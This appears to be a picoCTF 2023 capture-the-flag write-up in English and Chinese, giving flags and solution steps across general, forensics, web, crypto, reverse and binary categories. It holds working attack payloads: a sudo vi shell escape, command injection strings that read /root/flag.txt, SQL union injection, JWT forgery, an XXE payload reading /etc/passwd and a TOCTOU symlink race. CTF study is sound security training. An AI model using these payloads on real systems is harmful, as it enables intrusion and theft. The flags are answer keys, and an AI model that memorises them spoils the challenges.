# picoCTF 2023
###### tags: `CTF`

## General
### Rules 2023

rule -> other rules -> ending of section 1

`picoCTF{h34rd_und3r5700d_4ck_cba1c711}`

### repetitions

base64 many times

`picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_a2d1b8b6}`

### money-ware

[ref](https://www.cnbc.com/2017/06/28/ransomware-cyberattack-petya-bitcoin-payment.html)

`picoCTF{Petya}`

### chrono

```bash
grep -r "pico" / 2>/dev/null
```

found flag is at `/etc/crontab`

`picoCTF{Sch3DUL7NG_T45K3_L1NUX_88865742}`

### Permissions

[Use vi/vim for privilege escalation](https://web-wilke.de/use-vi-vim-for-privilege-escalation/)

use `sudo -l` to view permissions. found we can use `vi` with root permission

```
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

use `sudo vi` command to use root previlege. then use `:!/bin/bash` to spawn shell

```bash
root@challenge:/home/picoplayer# id
uid=0(root) gid=0(root) groups=0(root)
```

we have successfully privilege escalation and get root identity

flag is under `/root/.flag.txt`

`picoCTF{uS1ng_v1m_3dit0r_8a15f6a3}`

### useless

`man ./useless`

`picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_9332}`

### Special

command injection stuff

`aaaaa;grep$IFS-r$IFS"pico"$IFS.`

```
./blargh/flag.txt:picoCTF{5p311ch3ck_15_7h3_w0r57_008cf854}
```

`picoCTF{5p311ch3ck_15_7h3_w0r57_008cf854}`

### Specialer

we can only use `echo`, `cd`, `pwd` these 3 command

we can use `echo *` as `ls`, and `echo $(<filename)` as `cat filename`

[ref](https://unix.stackexchange.com/a/195484)

we can discover and draw a tree graph under `~`

```
~
|- abra
|    |- cadabra.txt
|    |- cadaniel.txt
|
|- ala
|    |- kazam.txt
|    |- mode.txt
|
|- sim
    |- city.txt
    |- salabim.txt
```

by reading 1 by 1, found flag is under `ala/kazam.txt`

`picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_58131e2c}`

## Forensics
### hideme

binwalk

`picoCTF{Hiddinng_An_imag3_within_@n_ima9e_568ea480}`

### PcapPoisoning

packet 507

`picoCTF{P64P_4N4L7S1S_SU55355FUL_b1995216}`

### who is it

https://www.whois365.com/tw/ip/173.249.33.206

`picoCTF{WilhelmZwalina}`

### FindAndOpen

apply `data` filter on pcap and read

find packet 48 seems like base64

get message:
`This is the secret: picoCTF{R34DING_LOKd_`

try using `picoCTF{R34DING_LOKd_` as password to unzip. success!

get full flag in extracted file

`picoCTF{R34DING_LOKd_fil56_succ3ss_5b79bdbb}`

### MSB
![](https://i.imgur.com/8Crvrr4.png)

`picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ee3cb4d8}`

### UnforgottenBits
FTK IMager

->Browsing History
```
www.google.com
https://www.google.com/search?q=number+encodings&source=hp&ei=WeC9Y77KJ_iwqtsP0sGu6A0&iflsig=AK50M_UAAAAAY73uaRxDkbHRUH8jn4OVhOgM8riUqvVI&ved=0ahUKEwj-2r_EgL78AhV4mGoFHdKgC90Q4dUDCAk&uact=5&oq=number+encodings&gs_lcp=Cgdnd3Mtd2l6EAMyBggAEBYQHjIFCAAQhgMyBQgAEIYDMgUIABCGAzIFCAAQhgM6DgguEIAEELEDEIMBENQCOgsIABCABBCxAxCDAToRCC4QgAQQsQMQgwEQxwEQ0QM6CAgAELEDEIMBOgsILhCABBCxAxCDAToFCAAQgAQ6CAgAEIAEELEDOggILhCABBDUAjoHCAAQgAQQCjoHCC4QgAQQClAAWI0VYPAXaABwAHgDgAHDA4gB-iKSAQkwLjMuNS40LjOYAQCgAQE&sclient=gws-wiz
https://en.wikipedia.org/wiki/Church_encoding
https://cs.lmu.edu/~ray/notes/numenc/
https://www.wikiwand.com/en/Golden_ratio_base
```

Python Decode 爆破 Golden Ratio Base 腳本
```python=
def from_base_phi(num):
    digits = str(num).split('.')
    if len(digits) == 1:
        digits.append('0')
    int_part = 0
    frac_part = 0
    for i in range(len(digits[0])):
        if digits[0][i] == '1':
            int_part += pow((1 + 5 ** 0.5) / 2, len(digits[0]) - i - 1)
    for i in range(len(digits[1])):
        if digits[1][i] == '1':
            frac_part += pow((1 + 5 ** 0.5) / 2, -(i + 1))
    return int_part + frac_part


k = "01010010100.01001001000100.01001010000100.00101010010101.01000100100100.00100100000100.01000100000101.01000100001010.00000100000001.00001001010000.00000100010010.01000100010010.01001001001000.10001001000101.01001001010000.00001001000100.01001001010001.00000100000010.01000100010000.00001001001000.10000100010100.01000000010100.01001010000010.00101001010000.00001010101000.10000100100100.00101001000100.01000100010100.01001001010001.00000100010010.01000100010000.00001001000101.01000100010010.01000100010001.00000100001000.10001001000101.01001001001010.00000100010100.01000100000100.01000100010001.00000100000001.00000100001010.00000100010001.00001001000100.01000100000001.00000100001010.00000100001000.10000100000001.00000100010010.01001001001010.00000100000100.01000100010001.00000100001000.10001001010000.00001001010000.00000100000101.01001001000100.01000100010010.01000100010010.01001001000100.01000100010010.01000100000101.01001001000100.01001001001010.00000100010100.01000100010001.00000100000100.01000100000100.01000100000010.01000100010001.00001001000101.01000100010010.01000100000010.01001001010001.00001001001010.00001001001000.10000100000100.01001001000101.01001001000101.01000100010010.01001001010000.00000100010010.01001001001000.10001001000100.01000100010010.01000100010001.00000100000101.01000100010000.00001001001010.00001001000100.01000000010100.01001001010101.01001010100010.00100100100100.00100100010100.01000100000001.00000100010010.01000100001000.10000100001010.00000100010010.01001001010000.00000100001000.10000100010010.01001001010001.00001001001000.10000100010010.01001001001010.00001001000101.01000100000010.01001001001000.10000100001010.00001001000100.01000100001000.10000100010000.00001001010001.00000100000010.01000100010010.01001001010001.00000100000001.00001001010001.00001001010000.00001001000101.01000100000010.01000100000010.01000100010100.01001001010001.00000000010100.010 "
for i in range(0, 127):
    t = k.split('.')
    t1 = t[0]+"."+t[1][0:len(t[0])-1]
    t2 = t[0] + "." + t[1][0:len(t[0])]
    t1 = str(from_base_phi(t1)).split('.')
    t2 = str(from_base_phi(t2)).split('.')
    if int(t1[1][0])>=5:
        a = 1-float('0'+'.'+t1[1])
    else:
        a = float('0'+'.'+t1[1]) - 0
    if int(t2[1][0]) >= 5:
        b = 1 - float('0' + '.' + t2[1])
    else:
        b = float('0' + '.' + t2[1]) - 0
    if a<=b:
        t1 = t[0] + "." + t[1][0:len(t[0]) - 1]
        y=1
    else:
        t2 = t[0] + "." + t[1][0:len(t[0])]
        t1=t2
        y=0
    print(round(from_base_phi(t1)))
    if y==1:
        k = k[len(t[0]) + len(t[0]) - 1:]
    else:
        k = k[len(t[0]) + len(t[0]):]
```
## Web
### findme

use burp to observe login activity

found 3 redirects: `/login` -> `/next-page/id=cGljb0NURntwcm94aWVzX2Fs` -> `/next-page/id=bF90aGVfd2F5XzQ4YzQ3YTk1fQ==` -> `/home`

found that the middle 2 redirect has title `flag`, so it is important

the page id seems like base64 string. just decode it

`picoCTF{proxies_all_the_way_48c47a95}`

### MatchTheRegex

enter `picoCTF{.*}`

`picoCTF{succ3ssfully_matchtheregex_04010049}`

### More SQLi

use `' or 1=1 -- #` hack into login page

got a search office function, seems that it may have SQL injection issue again (and it may be using `LIKE`)

found that `%' or 1=1 -- #` works

using union select `%' union select 1,2,3 -- #` found that there will use 3 column as select query

next, we have to get table names and column names

by hint, it use sqlite as db, so we don't have to find this information

[useful reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

use `%' union select tbl_name,2,3 FROM sqlite_master WHERE type='table' -- #` to find that there are 4 tables in databases

```
hints	2	3
more_table	2	3
offices	2	3
users	2	3
```

use `%' union select sql,2,3 FROM sqlite_master WHERE name='hints' -- #` to get column of table

columns from `hint`:

```
CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)	2	3
```

columns from `more_table`:

```
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)	2	3
```

read content of `hint` (`%' union select id,info,3 FROM hints -- #`)

```
1	Is this the real life?	3
2	Is this the real life?	3
3	You are close now?	3
```

not useful

read content of `more_table` (`%' union select id,flag,3 FROM more_table -- #`)

```
1	picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_90ce668a}	3
2	If you are here, you must have seen it	3
```

`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_90ce668a}`

### Java Code Analysis!?!

by the hint, the issue is at JWT

reading `src/main/java/io/github/nandandesai/pico/security/JwtService.java`. found that the secret key is generate by `secretGenerator.getServerSecret();`

reading `src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java`. found that the secret is a constant value `1234`. so the secret of JWT is `1234` and we are able to forgery JWT token

by login, the JWT is at `auth-token` in `local stroage`, we can use [jwt.io](https://jwt.io/) and modify JWT as following

```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1679478203,
  "iat": 1678873403,
  "userId": 2,
  "email": "admin"
}
```

after modify `auth-token` and `token-payload`, reload the page. then you will find that your role becomes Admin

so just read the `Flag` book

`picoCTF{w34k_jwt_n0t_g00d_caa8d1c4}`

### SOAP

XXE

[ref](https://ithelp.ithome.com.tw/articles/10240598)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>
<data><ID>&b;</ID></data>
```

`picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}`

## Crypto
### ReadMyCert

[tool](https://certlogik.com/decoder/)

`picoCTF{read_mycert_4448b598}`

### rotation

caesar key = 8

`picoCTF{r0tat1on_d3crypt3d_4a3dcb4c}`

### HideToSee

stegseek found password is "" and extract file

use `atbash` cipher to decrypt

`picoCTF{atbash_crack_ec4aba61}`

### SRA

利用 MuMu 的想法，用手工的方式來解

程式中給了 RSA 中的 e (`sloth`) 和 d (`envy`) 參數，要求解密

由於使用的 prime 較小，所以嘗試以因數分解的方式來解

$\begin{aligned}
e*d &\equiv 1\ (mod\ \phi(n)) \\
e*d - 1 &= k * \phi(n) \\
e*d - 1 &= k * (p-1) * (q-1) \\
\end{aligned}$


因數分解 $e*d - 1$，湊出兩組子因數相乘 + 1 後為 128 bit 長的質數

舉例:

```
e =  65537
d = 20248193389833143850779026323642558579914596345732550131528158224563568593721

e*d-1 = 1327005850189494748548505048172562361651862900710274137969960905563222594926693176
      = 2^3 * 3 * 13 * 109 * 17789 * 1058999 * 3890851 * 467260810157 * 522380406558922663 * 2180990751063937028394766200047
      
p = 2180990751063937028394766200047*2*3890851*13 + 1
q = 522380406558922663*2*467260810157*1058999*109*3*2 + 1
```

找子因數的技巧: 必定有至少一個 2，且可以從大數字開始找

接下來就是一般的 RSA 解密，求出字串送 server

以下是自動化腳本

:::spoiler solve.py
```python
from sage.all import factor
from pwn import *
from Crypto.Util.number import long_to_bytes, size, isPrime
from time import time

context.log_level = "debug"

conn = remote("saturn.picoctf.net", 58163)
# conn = process(["python", "chal.py"])

conn.recvuntil(b"anger = ")
c = int(conn.recvline(False))
conn.recvuntil(b"envy = ")
d = int(conn.recvline(False))
# d = 20248193389833143850779026323642558579914596345732550131528158224563568593721
e = 65537

k_phi = e*d - 1
# t0 = time()
factors = dict(factor(k_phi))
# print(time() - t0) # 0 ~ 2sec
assert(factors[2] >= 2)
p = 2
q = 2
factors[2] -= 2

PRIME_SIZE = 128

p_found = False
q_found = False
def find_pq(factors: dict):
    global p,q
    global p_found, q_found

    keys = sorted(factors.keys(), reverse=True)
    for k in keys:
        if(factors[k] != 0):
            if(not p_found):
                if(size(p*k + 1) == PRIME_SIZE and isPrime(p*k+1)):
                    p = p*k+1
                    p_found = True
                    factors[k] -= 1
                    return
                elif(size(p*k + 1) < PRIME_SIZE):
                    p = p*k
                    factors[k] -= 1
                    find_pq(factors)
                    if(not p_found):
                        factors[k] += 1
                        p = p // k
            elif(not q_found):
                if(size(q*k + 1) == PRIME_SIZE and isPrime(q*k+1)):
                    q = q*k+1
                    q_found = True
                    factors[k] -= 1
                    return
                elif(size(q*k + 1) < PRIME_SIZE):
                    q = q*k
                    factors[k] -= 1
                    find_pq(factors)
                    if(not q_found):
                        factors[k] += 1
                        q = q // k
            else:
                return
    return

# t0 = time()
find_pq(factors) # sometimes it seems like infinite loop. i don't know why :(
# print(time() - t0) # 0.8sec

print(p, q)

n = p*q
m = long_to_bytes(pow(c,d,n))
print(m)
conn.sendlineafter(b"> ", m)
conn.interactive()
```
:::

`picoCTF{7h053_51n5_4r3_n0_m0r3_2b7ad1ae}`

### PowerAnalysis: Warmup

每個 byte 做 256 次爆破，並從 sbox 一個一個位置比較最後一 bit 序列找可能的開頭，256 長度序列完全相符即代表此為該位置的 key，總共需要爆破 $256 * 16 = 4096$ 次即可完全爆破 key

腳本:
```python
from pwn import *

context.log_level = "warning"

Sbox = (
    ...
)


def sendAndReceive(data: bytes) -> int:
    conn = remote("saturn.picoctf.net", 65049)
    # conn = process(["python", "/home/ywc/myworkspace/picoctf_2023/poweranalysis_warmup/encrypt.py"])
    conn.sendlineafter(b"hex: ", data)
    conn.recvuntil(b"result: ")
    leak = int(conn.recvline(keepends=False).decode())
    conn.close()
    return leak

def leakNumToBit(nums: list) -> list:
    basenum = nums[0]
    firstIsHigh = any([n < basenum for n in nums])
    ret = []
    if(firstIsHigh):
        for n in nums:
            ret.append(0 if n < basenum else (1 if n==basenum else 2))
    else:
        for n in nums:
            ret.append(1 if n > basenum else (0 if n==basenum else 2))
    assert all([n != 2 for n in ret])
    return ret

def main(): #74c5575bde848990ef675a0216f469cd
    ket = b""
    # key = b"\x74\xc5\x57\x5b\xde\x84\x89\x90\xef\x67\x5a\x02\x16\xf4\x69"
    for b in range(len(key), 16):
        leaks = []
        for ct in range(256):
            data = b"\x00" * b + bytes([ct]) + b"\x00" * (16-b-1)
            leaks.append(sendAndReceive(data.hex().encode()))
            if(ct % 32 == 0):
                print(f"{ct} / 256")
        leaks = leakNumToBit(leaks)

        for trykey in range(256):
            found = True
            for i in range(256):
                if(leaks[i] != Sbox[trykey^i] & 0x01):
                    found = False
                    break
            if(found):
                key += bytes([trykey])
                print(key.hex() + "??"*(16-b-1))
    print("found key = " + key.hex())

if __name__ == "__main__":
    main()
```

`picoCTF{74c5575bde848990ef675a0216f469cd}`

## Reverse
### Reverse

strings

`picoCTF{3lf_r3v3r5ing_succe55ful_362575a1}`

### Safe Opener 2

strings

`picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_040868fe}`

### timer

use `jadx` extract files from apk

flag is `android:versionName` property in `AndroidManifest.xml`

`picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}`

### Virtual Machine 0

`.dae` is a 3D model format. open it in `blender`

found it is a gear with red 40 teeth, black 8 teeth, blue 8 teeth

so, gear ration is 5:1, so if the red turn 1 round then blue will turn 5 rounds

flag is `long_to_bytes(n*5)`

`picoCTF{g34r5_0f_m0r3_6a861f6b}`

### Ready Gladiator 0

the aim is to loose the game

if we don't move, we will never win.

so we will get the flag

```
;redcode
;name Imp Ex
;assert 1
mov 0, 0
end
```

`picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377}`

### Virtual Machine 1

more complex challenge

there has a special component look like roller. it is called `差速器` (differential)

the calculation of diffierential is `(left + right) / 2` [ref](http://zhidao.wangchao.net.cn/detail_4164399.html)

at the first part, the gear ratio is `(3*2 + 2^3) / 2 = 7`

at the second part, the gear ratio is `((2*3^2 + 2^2*5)/2 + 2^6*3)/2 = 191` (the big gear at the left side seems have a erronous for modeling)

at the third part, the gear ratio is `(3*2 + 2^3) / 2 = 7`

so the total gear ratio is `7*191*7 = 9359`

`picoCTF{m0r3_g34r5_3g4d_4261e7cd}`

### Ready Gladiator 1

reading the guild, found that it can using `Dwarf` to beat `Imp` sometime

[ref](https://vyznev.net/corewar/guide.html#start_dwarf)

redcode:
```
;redcode
;name Imp Ex
;assert 1
ADD #12, 3
MOV 2, @2
JMP -2
DAT #0, #0
end
```

Also, I ask New Bing and it tell me the following script, it will win more often then `Dwarf`

```
;redcode
;name Bing
;author Bing

start: SPL #0, bomb ; split to bomb instruction
       JMP gate     ; jump to imp-gate

bomb:  MOV #0, @cnt ; place a DAT at a random location
       ADD #1, cnt  ; increment the counter
       JMP bomb     ; loop forever

gate:  SUB #1, -10  ; imp-gate instruction
       JMP -1       ; loop forever

cnt:   DAT #0, #0   ; counter for random bombing
end
```

`picoCTF{1mp_1n_7h3_cr055h41r5_0b0942be}`

### (X) Ready Gladiator 2

在 discord 有人分享解法

![](https://i.imgur.com/CnKd8pZ.png)

來源應該是在 [reddit](https://www.reddit.com/r/programminggames/comments/11vaxk8/beat_classic_imp_100_of_the_time_in_corewars/)

```
;redcode
;name discord
;author discord
;assert 1
jmp 0, < -2
end
```

原理應該是弄一個 gate，在當 imp 往前進到 gate 範圍時將其殺掉 

`picoCTF{d3m0n_3xpung3r_47037b25}`

## Binary Exploitation
### two-sum

just find 2 number is positive and sum of it will overflow

for example: `10000000000000` and `10000000000000`

`picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_57371402}`

### babygame01

it is a maze game, and we found that we can walk outside of the maze

address of maze is at `$esp-0xaa0` and userflag is at `$esp-0xaa4` so we can move to position maze - 4 = `(-1, 86)` to cover the flag value to 0x2e

payload:
```
'd'*(89-4-3)+'w'*(4+1)+'p'
```

```!
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddwwwwwp
```

`picoCTF{gamer_m0d3_enabled_054c1d5a}`

### hijacking

use `sudo -l` found we have vi with root privilege

```
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

just like `misc/Permissions` challenge

found flag at `/root/.flag.txt`

`picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`

### VNE

with `ls -al` found `./bin` under `~` with `root` permission

also, it set the SUID. so we can execute this binary with root permission

```
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 16 07:16 .
drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
drwx------ 2 ctf-player ctf-player    34 Mar 16 07:16 .cache
-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin
```

when execute, found it needs `SECRET_DIR` environment

when set this to `/root`, found it lists the file under `/root`

```
Listing the content of /root as root:
flag.txt
```

guess it may use `"ls " + input` stuff, so it may have commend injection issue

we can use commend `export SECRET_DIR="/root/flag.txt;cat /root/flag.txt"` to read the `flag.txt` file

`picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}`

### tic-tac

TOCTOU stuff

in home directory, we have `txtreader`, `flag.txt`, `src.cpp` file. `txtreader` has root privilege with SUID

```
total 32
drwxr-xr-x 1 ctf-player ctf-player    33 Mar 16 07:26 .
drwxr-xr-x 1 root       root          24 Mar 16 02:27 ..
drwx------ 2 ctf-player ctf-player    34 Mar 16 07:24 .cache
-rw-r--r-- 1 root       root          67 Mar 16 02:28 .profile
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
```

here is `src.cpp`

:::spoiler src.cpp
```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```
:::

it will check permission of the file. if this file is not belong to the user, it will prevent user from reading it

We can create a symbol link and a `temp.txt` file, and also writing a script. The script will continully re-link the symbol link between `flag.txt` and `temp.txt`. We call `./txtreader` with argv as the symbol link. When the link point at `temp.txt`, it will pass the check. But when program reading the content, the link change to `flag.txt`. So we can reading the content with passing the check.

here is the script:
:::spoiler sol.sh
```sh
while :
do
   ln -sf ./temp.txt fflag
   ln -sf ./flag.txt fflag
done
```
:::

`picoCTF{ToctoU_!s_3a5y_007659c9}`